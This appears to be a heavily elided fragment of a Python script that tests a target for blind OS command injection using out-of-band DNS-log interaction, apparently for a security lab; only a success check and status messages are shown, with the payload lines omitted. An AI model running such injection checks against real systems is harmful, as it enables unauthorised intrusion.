...
def command_injection_dnslog(s, url, dnslog):
	...
	if (req.status_code == 200 and len(req.text) <= 3):
		print("\033[1;32;40m[+] Blind OS command injection with out-of-band interaction successful!")
	else:
...
def main():
	...
	print("\033[36m[+] Checking blind OS command injection with out-of-band interaction...")
